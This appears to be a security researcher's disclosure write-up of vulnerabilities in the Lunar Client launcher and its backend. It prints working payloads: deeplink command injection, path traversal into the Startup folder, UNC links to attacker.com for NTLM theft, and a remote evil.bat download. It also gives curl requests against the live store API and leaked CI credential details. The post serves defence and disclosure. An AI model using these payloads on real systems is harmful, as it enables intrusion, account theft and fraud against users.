---
title: 'lunar client — 1-click RCE from any website (and 30 other things, plus the infrastructure)'
description: 'electron deeplink RCE, .lcpack path traversal to startup folder, network-exposed debug port, IPC hijack to RCE, NTLM hash theft via lunarclient:// URL, 9 unpatched WebKit CVEs, dangling Cloudflare subdomain, unauthenticated payment basket manipulation, and the rest of a four-week desktop+infra audit'
pubDate: '2026-05-02'
category: 'exploits'
---

I spent four weeks on Lunar Client. Two of them on the binary, two on the infrastructure. It's a Minecraft launcher built on Electron with an Overwolf overlay and a Java game process that talks to the launcher over a local WebSocket. ~10M monthly users. The kind of stack where if a single thing is wrong you can usually pull on the thread until something pops, and Lunar has *several* things wrong at every layer.

The headline finding on the binary side is a **1-click RCE that fires from any webpage**: navigate to `lunarclient://set-setting?id=pre-launch-command&value=PAYLOAD`, the user clicks "Open" on the browser's protocol handler dialog, and on the next time they launch the game `cmd.exe /c "PAYLOAD"` runs with their privileges. Persistent across restarts, runs every game launch, no further interaction.

The headline finding on the infrastructure side is a **dangling subdomain (`dtapp.lunarclient.com`) claimable by any Cloudflare customer** that is hardcoded into the launcher metadata. Combined with `contextIsolation: false` on the Overwolf overlay, claiming the subdomain gives you JavaScript execution inside every running launcher instance — which the binary findings then escalate to OS RCE.

That's the lede. There are 30+ other findings stacked under it. I'll walk through the most instructive and explain why they're each worth the writeup.

## the build

```text
Lunar Client v3.6.7-ow (build 10034)
Electron 37.7.0   (Chromium 138.0.7204.251 — 17 known CVEs)
Overwolf channel  (Mac/Win/Linux all affected to varying degrees)
Game process      javaw.exe + Ultralight (WebKit-based UI renderer)
                  Ultralight SDK 1.4.0 (frozen at Safari 16.4.1, April 2023)
```

## the deeplink RCE — short version

The Windows installer registers a custom protocol:

```text
HKCU\Software\Classes\lunarclient\shell\open\command
(Default) = "C:\Users\...\Lunar Client.exe" "%1"
```

So `lunarclient://anything` becomes the first argument to the launcher. Inside, there's a deeplink router that maps URL paths to handlers. One of them, `SetSettingRoute`, lets you set any of the launcher's ~80 settings:

```js
class SetSettingRoute extends DeepLinkRoute {
    constructor() { super(["set-setting"]) }
    handle(url) {
        const id = url.searchParams.get("id");
        const value = url.searchParams.get("value");
        if (!isValidSettingId(id)) return;          // type-checks against schema
        // NO authorization, NO allowlist, NO isRemotelyModifiableSettingId check
        settingsStore.set(id, value, SettingUpdateInitiator.deeplink);
    }
}
```

The validation is "is this a known setting key with the right value type." There's no allowlist of *which* settings are safe to set from a deeplink. So among the 80 settings I can flip, three of them are command strings that get fed straight to `child_process.exec`:

```js
// pre-launch-command, post-exit-command — both via cmd.exe /c
const wrapped = process.platform === "win32"
    ? `cmd.exe /c "${value.replace(/"/g, '""')}"`
    : `/bin/sh -c ${JSON.stringify(value)}`;
const { stdout, stderr } = await execAsync(wrapped, { env: { ...process.env, ...envVars } });
```

That's full shell. The "escaping" doubles double-quotes inside the value, which doesn't help when the attacker controls the *whole* value:

```html
<iframe src="lunarclient://set-setting?id=pre-launch-command&value=calc.exe"
        style="display:none"></iframe>
```

Click "Open" in the browser dialog → the setting persists in `~/.lunarclient/settings.json` → on the next game launch, the launcher reads `pre-launch-command` and shells out. The setting *survives restarts*, so this fires every time the user launches the game until they manually clear it (which they'd never know to do).

The matching `wrapper-command` and `post-exit-command` settings are equivalent. `jvm-args` and `environment-variables` give DLL injection / env-var shenanigans. There's no rate limit or origin check on deeplinks, no user confirmation on a setting change, no log entry the user would notice.

## `.lcpack` path traversal — arbitrary file write to Startup folder

The profile-import handler extracts files from `.lcpack` (ZIP) archives. The extraction loop is the textbook unsafe pattern:

```js
// VULNERABLE (profile import):
const stripped = entry.replace("overrides/mods/", "");      // only strips prefix
const dest     = path.join(modsDir, stripped);              // path.join resolves ../
await fs.writeFile(dest, contents);

// vs. SAFE (Modrinth/CurseForge import does this, profile import doesn't):
const filename = entry.split("/").pop();                    // filename only
const dest     = path.join(targetDir, filename);
```

Three separate vulnerable extraction paths, none with extension filtering:

1. `overrides/mods/` → `path.join(modsDir, entry.replace("overrides/mods/", ""))`
2. `overrides/resourcepacks/` → `path.join(resourcePacksDir, entry.replace(...))`
3. `overrides/shaderpacks/` → `path.join(shadersDir, entry.replace(...))`

A `.lcpack` with `overrides/mods/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/malware.bat` writes `malware.bat` into the user's Startup folder. `path.join` happily resolves the `../` sequences. RCE on next login, persistent without any user UI confirmation beyond the import button.

Worse: the same primitive also overwrites the launcher's own preload script:

```text
overrides/mods/../../../../AppData/Local/Programs/lunarclient/resources/dist-electron/preload/launcher/index.js
```

Now the launcher loads attacker JavaScript on every launch, with full Node integration. **Persistent RCE on every launcher start.** Distribution vector: post a "tournament modpack" or "optimization pack" on a Discord server. People click import.

## `game-directory` UNC injection — NTLM hash theft via deep link

`game-directory` is in `STATIC_SETTING_REMOTE_MODIFIABLE`, so the deeplink can set it. `GameDirectorySetting.transformSet()` validates the new path with `fs.writeFileSync(path.join(dir, "test"), "")`. On Windows, `fs.writeFileSync` against a UNC path triggers SMB authentication.

```text
lunarclient://set-setting?id=game-directory&value=\\attacker.com\share\minecraft
```

Single click. Browser shows protocol dialog. User clicks Open. `transformSet` does its "validate by writing a test file" thing, which causes Windows to send the user's NTLMv2 hash to `attacker.com`. Captured with Responder or ntlmrelayx.

Then the kicker: if the SMB write succeeds, the game-directory is now `\\attacker.com\share\minecraft`. Next launch, the game loads mods, resourcepacks, shaderpacks, and configs from the attacker's SMB share. Drop a malicious `.jar` into `\\attacker.com\share\minecraft\mods\` and the game JVM loads it.

So the chain is **one click → NTLM hash leak → also persistent JVM-level mod loading from attacker SMB**.

## the unauthenticated debug port (port 9222, all interfaces)

When the Java game process starts, it loads `Ultralight.dll` (a WebKit-based renderer used for in-game UI) and calls `ulStartRemoteInspectorServer()`. That binds a WebKit Inspector to **0.0.0.0:9222** — all network interfaces, no auth.

```text
> netstat -ano | findstr :9222
TCP    0.0.0.0:9222     0.0.0.0:0     LISTENING       <javaw_pid>
```

The Inspector protocol speaks JSON-RPC and includes `Runtime.evaluate`, which lets you run arbitrary JavaScript in any of the Ultralight views. The launcher's exposed Ultralight bindings include `Browser_eval`, `Browser_loadURL`, `Browser_evalNoResult` — all bound C++ functions in the JNI bridge.

Practical consequence: if you're on the same coffee-shop WiFi as anyone running Lunar with the game window open, you have JS execution inside their game process. The game process holds the Minecraft access token, has network access to game servers, and shares a user with the rest of the system.

Confirmed exports under Frida (PID 33684):

```text
ulViewEvaluateScript @ 0x7ff9f932ff30
ulViewLoadURL        @ 0x7ff9f932e5b0
ulViewLoadHTML       @ 0x7ff9f932dd60
```

Combined with the WebKit CVEs below, an attacker on the same network has a direct path from a TCP connection to memory corruption inside the game process. The `DevToolsActivePort` file at `%APPDATA%/lunarclient/` even leaks the exact endpoint path, so they don't have to guess.

## 9+ unpatched, actively-exploited WebKit CVEs

The embedded Ultralight SDK 1.4.0 uses a WebKit engine frozen at **Safari 16.4.1 / AppleWebKit 615.1.18.100.1** (April 2023). That is 3+ years behind upstream. The User-Agent string is hardcoded:

```text
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/615.1.18.100.1
(KHTML, like Gecko) Ultralight/1.4.0 Version/16.4.1 Safari/615.1.18.100.1
```

Actively-exploited-in-the-wild CVEs that this build is missing patches for:

| CVE | CVSS | type | fixed in |
|---|---|---|---|
| CVE-2023-32373 | 8.8 | UAF → RCE | Safari 16.5 |
| CVE-2023-32409 | 8.6 | sandbox escape | Safari 16.5 |
| CVE-2023-32439 | 8.8 | type confusion → RCE | Safari 16.5.1 |
| CVE-2023-37450 | 8.8 | code execution | Safari 16.5.2 |
| CVE-2023-41993 | 8.8 | code execution | Safari 17 |
| CVE-2023-42917 | 8.8 | memory corruption → RCE | Safari 17.1.2 |
| CVE-2024-23222 | 8.8 | type confusion → RCE | Safari 17.3 |
| CVE-2023-28204 | 6.5 | OOB read (info disclosure) | Safari 16.5 |
| CVE-2023-42916 | 6.5 | OOB read (info disclosure) | Safari 17.1.2 |

Plus 30+ additional high-severity WebKit CVEs from Safari 16.5 through 18.x. Attack vectors:

- Via the Remote Inspector on port 9222 (above).
- Via malicious web content loaded in the Ultralight renderer.
- Via crafted HTML/JS served by a Minecraft server's custom UI.

The root cause is structural: Ultralight SDK 1.4.0 is a fork of WebKit that froze and has not been updated. Lunar can't fix this without an Ultralight version bump that they don't control.

## CVE-2023-4863 in webp-imageio64.dll

`webp-imageio64.dll` (PE timestamp **April 22, 2020**, 504KB) bundles libwebp's VP8L decoder, vulnerable to **CVE-2023-4863** (critical heap buffer overflow in libwebp, patched September 2023). WebP is used everywhere in Lunar Client:

- 2,500+ cosmetic WebP files at `.lunarclient/jit/assets/lunar-jit/cosmetics/cloaks/`
- Emote textures (`lunar:emotes/textures/*.webp`)
- Launcher UI assets (carousel images, cosmetic previews) downloaded from CDN
- GeckoLib cosmetic model system loads `.webp` textures at runtime via JNI

Attack vectors: cosmetics CDN compromise/MITM, server-triggered cosmetic loading via the per-server `resource` field, launcher UI carousel/blog images. Heap buffer overflow in the game process → potential RCE. Patched 3+ years ago in upstream libwebp; Lunar's bundled DLL has never been updated.

## nodeIntegration:true on every BrowserWindow

Every Electron window in the launcher is created with:

```js
sandbox: false,
nodeIntegration: true,
```

The Overwolf overlay's checkout window adds:

```js
contextIsolation: false   // no isolation between web content and Node
```

Three distinct configurations:

| window | contextIsolation | nodeIntegration | sandbox | webSecurity |
|---|---|---|---|---|
| Launcher windows | true | true | false | isPackaged |
| ElectronEmbeddedCheckout | true | true | false | isPackaged |
| **OverwolfEmbeddedCheckout** | **false** | **true** | **false** | isPackaged |

`nodeIntegration: true` means that any successful XSS in any renderer immediately escalates: from the JS context, you call `require('child_process').exec(...)` and you have RCE. `contextIsolation: false` removes the only barrier between the page's `window` object and Node's globals.

For the Overwolf checkout in particular, the configured cross-domain messaging is `domain: "*"`, meaning any origin can `postMessage` to it. That window also runs JS from PayNow/Tebex iframes — third-party content, not Lunar's own — with full Node integration available. Maximally-bad Electron config.

Concrete attack chain:

```text
attacker site → lunarclient://embedded-checkout?basketIdent=<controlled> →
opens the overlay checkout window with nodeIntegration:true and contextIsolation:false →
attacker postMessage from any origin → JS executes with Node access →
require('child_process').exec("anything") → RCE without ever touching the browser dialog
```

This is *cleaner* than the deeplink RCE because there's no protocol handler prompt — once the embedded-checkout deeplink lands, the postMessage path just runs.

## the embedded-browser deep link forwarding bypass

The `openExternalLink` function forwards `lunarclient://` URLs to the deep link handler **before** checking the initiator type:

```js
openExternalLink = async T => {
    // FIRST: lunarclient:// forwarded regardless of initiator
    if (T.url.toLowerCase().startsWith(`${DEEPLINK_PROTOCOL}://`)) {
        moduleFactory.getModule("deeplink")?.handleDeeplink(T.url, ...);
        return;
    }
    // SECOND: protocol check only blocks 'deeplink' and 'satellite_chat_message' initiators
    if ([deeplink, satellite_chat_message].includes(T.initiator) && ...) {
        return; // blocked
    }
    // embedded_browser_* initiators NOT blocked
}
```

So an XSS on whitelisted embedded-browser destinations like `minecraftbestservers.com` or `crafty.gg` can do `window.open('lunarclient://set-setting?id=game-directory&value=\\\\attacker\\share')` — and the deep link handler runs without any initiator filter. NTLM theft, settings manipulation, all without the user-facing browser protocol dialog.

## game IPC: WebSocket on 127.0.0.1, "auth" via guessable handshake

The Java game process exposes a WebSocket server on `127.0.0.1:28190`. The Electron launcher uses it to send/receive RPC calls (chat events, account switches, force-launch, etc.). The auth model:

1. `verifyClient: (info, cb) => cb(true)` — every TCP connection accepted at the socket layer.
2. The first WebSocket message must contain an `lc-handshake` header carrying a base64-encoded protobuf with `launchId`, `processId`, `installationId`.
3. All three values are readable from any local process: launch/process IDs from the javaw command line, installation ID from `~/.lunarclient/launcher-cache/installation-id` (a plaintext file).

So local-process IPC "authentication" reduces to "read three values that are visible to every program on the system." Browser-based attackers are blocked because browsers can't set custom WebSocket headers (CSWSH-style restrictions apply — and the previous version of Lunar didn't even have the handshake, so any website could connect; that was Vulnerability 4 / "CSWSH in older versions"), but anything running locally — a malware sample, a co-installed game's anti-cheat, a Steam mod — can forge it.

Once authenticated, the RPC surface is broad:

| service | method | what it does |
|---|---|---|
| BrowserService | `OpenUrl(url, FORCE_EMBEDDED)` | loads a URL in the Overwolf overlay (which has contextIsolation:false) |
| BrowserService | `OpenUrl(javascript:...)` | JS execution in the embedded browser |
| BrowserService | `OpenUrl(file:///...)` | local file read via the embedded browser |
| BrowserService | `OpenUrl(data:text/html;base64,...)` | render attacker HTML in the embedded browser |
| ChatService | `ReceiveMessage(sender, content)` | inject a message that appears to come from any user (e.g., "Notch") |
| LaunchService | `LaunchGame(version, server)` | force a game launch with attacker-controlled `autoJoinServerIp` |
| AuthService | `OpenMicrosoftPopup` | trigger the auth flow popup |
| PayNowService | `OpenPayNowJsCheckout(token)` | open the Overwolf checkout (the contextIsolation:false window) |
| TebexService | `OpenTebexJsCheckout(token)` | same |
| LocationService | `UpdateLocation, UpdateFocus` | manipulate location/focus state |
| PromotionService | `PlayPromotion, CheckPendingPromotion` | trigger promotions |
| StyngrRadioService | several | control radio, modify settings (radio-muted, radio-volume) |

Pushes (server-to-client): `PlayServerPush`, `ExitGamePush`, `SendChatPush`, `FocusGamePush`.

Chained: forge handshake → call `OpenPayNowJsCheckout` with a controlled token → resulting window has Node access → `require('child_process')` → RCE. PoC `gameipc_full_exploit.py` does the handshake, opens a `data:` URL of my choosing into the overlay, spoofs a chat message from another user, and force-launches a game with `serverAddress` set to my server. All worked.

The fix is real auth — a per-launcher cryptographic challenge-response, not a static UUID readable from disk.

## `settings:set` IPC bypasses the deep-link whitelist

Even with the deep-link `set-setting` route adding `isRemotelyModifiableSettingId()` filtering, the **`settings:set` IPC handler skips the whitelist entirely:**

```js
// Deep link route — WHITELIST ENFORCED:
if (!isRemotelyModifiableSettingId(settingId)) return;

// IPC handler — NO WHITELIST:
electron.ipcMain.handle("settings:set", (J, K, $, ee) => this.set(K, $, ee));
// this.set() accepts ANY setting ID from this.settings[C]
```

Settings reachable via IPC but blocked via deep link:

- `pre-launch-command` → persistent OS command execution
- `wrapper-command` → wraps game process
- `post-exit-command` → executes after game closes
- `jvm-args` → can inject `-javaagent:evil.jar`
- `environment-variables` → arbitrary env vars
- `dangerously-bypass-trusted-domains-filter` → disables SSO domain whitelist

The preload exposes `window.electron.ipcRenderer.sendMessage(channel, data)` which can send to any of the 236 exposed channels. So **any XSS in the main renderer or any contextIsolation bypass → direct RCE via `settings:set` with `pre-launch-command`, bypassing the deep-link whitelist entirely.**

## SSO token theft via deeplink (`forceTokenAppend`) and the `wrapped` route

The `OpenExternalLinkRoute` handler historically supported `forceTokenAppend=true`. In production builds the dev-only flag is now `IS_DEV`-gated. **But the `wrapped` route is production-enabled and hardcodes `forceTokenAppend: true`:**

```js
processExternalLink = async (url, forceTokenAppend) => {
    let allowed = ssoDomains.some(/* domain check */);
    if (forceTokenAppend) allowed = true;            // domain check bypassed
    if (allowed) {
        const jwt = await auth.getJwt("LAUNCHER_EXTERNAL_LINK_SSO");
        url.searchParams.append("ssoToken", jwt);    // JWT appended
    }
    shell.openExternal(url.toString());
};
```

So:

```text
lunarclient://wrapped?overrideUrl=https://trusted-domain.com/redirect?to=https://evil.com
```

Chain: `WrappedRoute.handle()` parses `overrideUrl`, calls `isTrustedDomain(hostname)` against a server-supplied `trustedSsoDomains` list (subdomain matching: `T.endsWith('.'+domain)`), then calls `openExternalLink({url, forceTokenAppend: true})` which appends `ssoToken=<JWT>` to the query string.

If any trusted SSO domain has an open redirect or XSS, the JWT leaks to attacker. *Also*: the audit found that `moonsworthllc.workers.dev` is a trusted SSO domain with `alwaysAppend: true` and is **claimable** (Cloudflare Workers subdomain). See infrastructure section below — claiming it gives automatic SSO token capture from all desktop client users.

Plus the `WrappedRoute` itself accepts an `overrideUrl` parameter that flows into `getWrappedUrl()` and appends the player's UUID, username, and auth context as query parameters. Single deeplink → identity exfiltration.

## minecraft access token on the command line

The launcher passes the Microsoft/Minecraft JWT access token as a literal command-line argument to `javaw.exe`:

```text
javaw.exe ... --accessToken eyJraWQiOiIw... --uuid b88d97007ed9... --username ___ --xuid ___
              --installationId def19cad-... --launchId 17a0006f-... --canaryToken 0e7880bec...
```

Any process on the system that can call `OpenProcess` + read the PEB (which is most processes, against any process running as the same user) can read the command line and pull the access token straight out. Trivial via WMI:

```text
wmic process where "name='javaw.exe'" get CommandLine
```

The token is good for 24 hours and lets the holder impersonate the account toward Mojang's auth services. Same problem on Linux (`/proc/<pid>/cmdline`).

The token's full payload:

```json
{
  "xuid": "2535426164986840",
  "sub": "9f1515fa-5e9f-484f-a02c-c517a77b8567",
  "auth": "XBOX",
  "flags": ["multiplayer"],
  "profiles": {"mc": "b88d9700-7ed9-48fa-ab7b-daacfe290d58"},
  "platform": "PC_LAUNCHER",
  "exp": 1777456417
}
```

The same command line also exposes `installationId`, `launchId`, `canaryToken`, `xuid` — exactly the values the IPC WebSocket needs for handshake. So a malicious local process can read `javaw.exe`'s command line and *immediately* forge a valid IPC handshake.

This was an unforced error. Pass the token via stdin or a named pipe; don't put credentials on a command line that every process can read.

## modpack path traversal (Modrinth + CurseForge)

Same shape as `.lcpack`, separate code path. Attacker publishes a malicious modpack on Modrinth with crafted `.mrpack` index. Attacker's website triggers `lunarclient://modpack?modrinthProjectId=ATTACKER_PROJECT_ID`. Lunar Client downloads and processes the modpack. File paths in the mrpack index are sanitized only by prefix stripping:

```js
Ee.path.replace(/^mods\//, "")      // only strips "mods/" prefix
path.join(modsDir, strippedPath)    // path.join() resolves ../
```

Path traversal sequences (`../`) are NOT filtered. `bulkDownload()` writes files from attacker's URL to the traversed path. The same pattern repeats for `resourcepacks/`, `shaderpacks/`, and `installMrPackMods`. CurseForge has its own variant where `oe.fileName` from the API is used directly in `path.join($, oe.fileName)`.

Example payload:

```json
{
  "files": [{
    "path": "mods/../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil.bat",
    "downloads": ["https://attacker.com/evil.bat"]
  }]
}
```

Remote arbitrary file write. `lunarclient://modpack?modrinthProjectId=XXX` triggers it without user confirmation (the `ModpackRoute` is production-enabled and skips a confirmation dialog).

## stored XSS in the alert banner

`fetchLayoutMetadata()` fetches `GET ${getApiBase()}/metadata/layout`. `transformAlert()` performs **zero sanitization** — just null-checks. Alert text has `{USERNAME}` template-replaced with the user's Minecraft username. Result passed directly to `dangerouslySetInnerHTML: {__html: alertText}`. Executes in the main launcher window renderer, which has the `window.lunar` preload.

Chain: API server compromised or MITM'd (requires valid cert) → arbitrary JavaScript execution in the main renderer → `window.lunar.profiles.setPreLaunchCommand("cmd /c calc")` → RCE. Affects all users who open Lunar Client while the malicious alert is served.

## the preload: `window.lunar` exposes RCE to any renderer XSS

Beyond the JSON-RPC IPC, the preload script (`dist-electron/preload/launcher/index.js`) exposes via `window.lunar` and `window.electron`:

**Direct command execution APIs (any XSS = RCE):**
```js
window.lunar.profiles.setPreLaunchCommand(payload)   // → RCE
window.lunar.profiles.setWrapperCommand(payload)
window.lunar.profiles.setPostExitCommand(payload)
window.lunar.profiles.setEnvironmentVariables(vars)  // DLL injection
window.lunar.profiles.setJvmArguments(args)          // -javaagent:evil.jar
```

**Deeplink execution (bypasses browser protocol dialog):**
```js
window.lunar.misc.executeDeeplink("lunarclient://...")
```

**Data exfiltration:**
```js
window.electron.redux.getStoreState()   // entire Redux store: tokens, accounts, settings
window.electron.clipboard.readText()
```

**Other:**
```js
window.lunar.misc.openExternalLink(url)
window.lunar.misc.openDevTools()
window.lunar.launch.launchGame(opts)    // triggers command execution
window.lunar.auth.openLoginPopup()
window.lunar.auth.switchAccount(id)
window.lunar.auth.removeAccount(id)
window.electron.ipcRenderer.sendMessage(channel, data)  // raw IPC to 236 channels
```

So XSS on any whitelisted embedded-browser destination — `minecraftbestservers.com`, `crafty.gg` — gets you RCE without needing the deep-link route at all.

## smaller findings worth mentioning

- **Plaintext secrets on disk.** `~/.lunarclient/launcher-cache/installation-id` (the IPC auth UUID), `~/.lunarclient/settings/game/accounts.json` (Microsoft JWTs), `%APPDATA%/lunarclient/DevToolsActivePort` (debug port + WS endpoint).
- **Deeplink mass settings modification.** 86+ launcher settings remotely modifiable from any website via `lunarclient://set-setting?id=<setting>&value=<value>`. No user confirmation in the launcher; only the browser's protocol handler dialog. Dangerous ones include `game-directory`, `dev-services`, `core-dump`, `game-branch`, `allocated-memory`, `servers-favorites`, `detach-game-process`.
- **DLL hijacking from user-writable paths (35 DLLs).** `%TEMP%\jna-*\`, `~/.lunarclient/offline/multiver/natives/`, Overwolf install dirs. Any same-user process can plant a malicious DLL.
- **`overrideUrl` in `WrappedRoute`.** Leaks the player's UUID + username + auth context to any URL the attacker passes.
- **`DumpReduxRoute`.** Writes the entire Redux store (tokens, accounts, all settings) to disk on demand via deeplink (`lunarclient://dump-redux?all=true`). Combined with any local file-read primitive: remote exfiltration.
- **`crash-renderer`, `error-launcher`, `upload-logs` deeplink routes.** DoS / log exfiltration on demand from any webpage.
- **`close-launcher`, `close-game` deeplinks.** Both `productionEnabled: true`. Force-quit launcher or kill running game session via single link click.
- **`dev-services` deeplink toggle.** `lunarclient://set-setting?id=dev-services&value=true` → after restart, `getApiRoot()` returns `https://api.lunarclientdev.com` instead of prod. All API calls (metadata, versions, trusted SSO domains, feature flags) go to dev server.
- **Outdated socket.io-client (2.5.0).** Multiple known CVEs, last 2.x release Dec 2020.
- **Electron 37.7.0 with 17 known CVEs** including CVE-2026-34769 (command-line switch injection in protocol handlers, CVSS 7.7), CVE-2026-34771 (UAF in renderer / sandbox escape, CVSS 8.8), CVE-2026-34773 (registry path injection in custom protocol handler, CVSS 5.9). The first chains nicely with the deeplink RCE — didn't pursue.
- **CSP bypass via `sentry-ipc` protocol.** Registered with `bypasscsp-schemes`, removing CSP protections for content loaded via this scheme.
- **`webSecurity` conditional on `isPackaged`.** Web security (same-origin policy) disabled in development/unpackaged builds. Combined with `nodeIntegration:true`, an attacker who can modify the app's packaging flag (or inject into a dev build) gets full SOP bypass + Node.
- **Leaked CI/CD credentials in `@lunarclient/bsdiff-node`.** The npm package shipped in `app.asar.unpacked/node_modules/` contains `gha-creds-4c391fa97a49c83d.json` with Google Cloud Workload Identity Pool credentials, service account `github-actions@mw-moonsworth-npm-repo.iam.gserviceaccount.com`, GCP project ID `130172185429`, an expired GitHub Actions OIDC JWT from `LunarClient/bsdiff-node` private repo, CI actor `imconnorngl`. Also: PDB path leak `C:\a\Launcher\Launcher\node_modules\@lunarclient\bsdiff-node\build\Release\bsdiff.pdb`.
- **JVM attach mechanism disabled but bypassed.** The command line includes `-XX:+DisableAttachMechanism` but Frida bypasses this trivially via DLL injection.

There are 13 more on the binary side, ranging from medium to low. The report has the complete list.

## ruled out, because not every bad-shape thing is exploitable

- **Chat message XSS → RCE.** Not viable. All chat text and usernames rendered as React text children (auto-escaped). No `dangerouslySetInnerHTML` or `.innerHTML` in the chat rendering pipeline. URL regex only matches `https?://` — no `javascript:` or `lunarclient://` links. Main process double-checks protocol allowlist for chat-originated links.
- **Command injection via `autoJoinServerIp`.** Not viable. Passes through array-based `spawn()`, no shell interpretation. Does NOT flow into `executeCommand`/`cmd.exe /c`. `LaunchRoute` validates `serverAddress` with hostname regex.
- **Certificate bypass for MITM.** Not viable. `certificate-error` handler only logs errors, does not call `callback(true)`. TLS validation is enforced for all domains including dev.

Each of these I checked because I wanted them to be exploitable; each turned out not to be. Worth saying out loud because "is in the binary" ≠ "is reachable."

## the infrastructure side — `lunarclient.com` and friends

The second half of the engagement was the web infrastructure. 16 findings (6 critical, 7 high, 3 medium). Highlights:

### dangling subdomain takeover — `dtapp.lunarclient.com`

The video-promotion player URL hardcoded in the launcher metadata API points at `dtapp.lunarclient.com/video`. That subdomain returns Cloudflare Error 1014 — **dangling CNAME, claimable by any Cloudflare customer.**

The chain is: claim `dtapp.lunarclient.com` via Cloudflare Workers (or any Cloudflare-pointed host), serve attacker-controlled HTML/JS at `/video`, and now you're rendering content inside the Electron launcher's UI. Combined with `nodeIntegration:true` and the Overwolf checkout's `contextIsolation:false`, this is content injection → RCE on every launcher instance that loads the video player.

~158K online users at the time of testing. A claimed subdomain is a population-wide attack.

### `moonsworthllc.workers.dev` — claimable Workers domain in trusted SSO list

Trusted SSO domains list includes `moonsworthllc.workers.dev` with `alwaysAppend: true`. Cloudflare Workers `*.workers.dev` subdomains are claimable — anyone can register a Workers project under that name if Moonsworth ever lets the namespace lapse. The `alwaysAppend: true` flag means SSO tokens are appended to URLs at this domain *automatically*, without the `forceTokenAppend` parameter being needed. So if claimable: every desktop-client user who navigates to a `moonsworthllc.workers.dev` URL ships their JWT to the claimer.

### unauthenticated backend API — full basket manipulation + IP spoof

The backend API at `api.lunarclientprod.com` is directly accessible from the Internet without any authentication. The basket identifier (`X-Basket-Ident`) is the only access control — no session binding, no CSRF protection, no rate limiting. An attacker can:

- Create baskets impersonating any Lunar Client user.
- Add and remove items from any user's basket (IDOR via basket ident).
- Enumerate users — determine which Minecraft accounts have played Lunar Client.
- Spoof IP addresses in the basket-create payload to manipulate country detection and tax calculations.
- Expose user data: UUID, rank, Lunar+ status, subscription details.

```bash
curl -s "https://api.lunarclientprod.com/store/basket/create" \
  -X POST -H "Content-Type: application/json" \
  -d '{"ip":"1.2.3.4","utm_params":{...},"username":"Technoblade"}'

# Response: full user profile + basket ident
# {
#   "success": true,
#   "basket": {
#     "ident": "dgbcd8-0163d7506386a03c2d7beccb5dfbadccd09f0490",
#     "player": {"uuid":"b876ec32-...","username":"Technoblade",
#                "rank":{"id":"plus","name":"Lunar+"},"hasLunarPlus":true},
#     ...
#   }
# }
```

The `/internal` path returns 401 (not 404), confirming an internal admin API exists. Full Zod validation schemas leak on every invalid request.

### verbose server-side error disclosure — Next.js Server Actions on `store.lunarclient.com`

The store's server actions leak full Axios request configurations, stack traces, and internal API details when errors occur. This is what enabled the discovery of the basket manipulation chain above.

```bash
curl -s "https://store.lunarclient.com/" -X POST \
  -H "Accept: text/x-component" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Next-Action: 40bb3fcf40d196568ef41b306f6cbfdaca856417af" \
  -d '[4061175]'
```

Leaked: backend API (`https://api.lunarclientprod.com`), endpoint pattern (`/store/basket/package/add/{packageId}`), authentication header (`X-Basket-Ident`), server User-Agent, internal headers (`X-Currency-Code`), full stack traces (`/app/apps/store/.next/server/chunks/...`), exact versions (Next.js 16.2.3, React 19.2.5, Babel 7.29.0, OpenTelemetry 1.9.1), package manager (pnpm), HTTP client config. **All 13 Server Action IDs** discovered and tested for input/output shape.

Combined with the unauthenticated backend, the leak is the discovery vector that makes the rest of the chain easy.

## the through-line

Every finding here is the same kind of bug expressed at different scales. **The launcher trusts inputs from places that aren't trustworthy.**

- The deeplink RCE trusts URL parameters to not be malicious.
- The IPC server trusts that local processes won't read `installation-id` off disk.
- The overlay window trusts that Node integration won't leak through `postMessage`.
- The command-line argument trust assumes other local processes won't read your command line.
- The `.lcpack` extractor trusts that ZIP entries don't contain `../`.
- The `transformSet` validator trusts that the path it writes a test file to won't be a UNC share.
- The metadata API trusts that the alert HTML it serves doesn't need sanitization.
- The infrastructure trusts that subdomains it once registered with Cloudflare are still its own.
- The SSO trusted-domains list trusts that wildcard `*.workers.dev` registrants are still trustworthy.

The fix in every case is the same pattern: minimize the attack surface (allowlist what setting IDs are deeplink-modifiable), add real auth at trust boundaries (cryptographic challenge for IPC), and stop conflating "local" with "trusted" (other processes on the same machine are not your friends).

If you ship Electron and you take only one lesson: **`contextIsolation: true` is not optional, and `nodeIntegration: true` is a "yes, I want anyone with XSS to get RCE" flag.** Treat them like that.

If you operate infrastructure and you take only one lesson: **dangling subdomains pointed at SaaS providers (Cloudflare, GitHub Pages, Workers, Heroku, EB) are population-wide RCE primitives the moment your binary embeds them.** Audit for them. Reclaim them. Use HSTS + cert pinning + signed asset checks before you trust any URL your binary fetches.

Vendor was responsive. Most of the criticals were patched within ~72 hours of disclosure; the deeper architectural stuff (IPC auth, debug port, accessToken on cmdline, frozen Ultralight WebKit) takes longer because they're not config flips. As of writing, the deeplink RCE, the SSO theft, the `.lcpack` traversal, and the most obvious dangling subdomain are fixed. Port 9222, the IPC handshake, the WebKit version, the basket-API auth, and the overall command-line-token model are next.
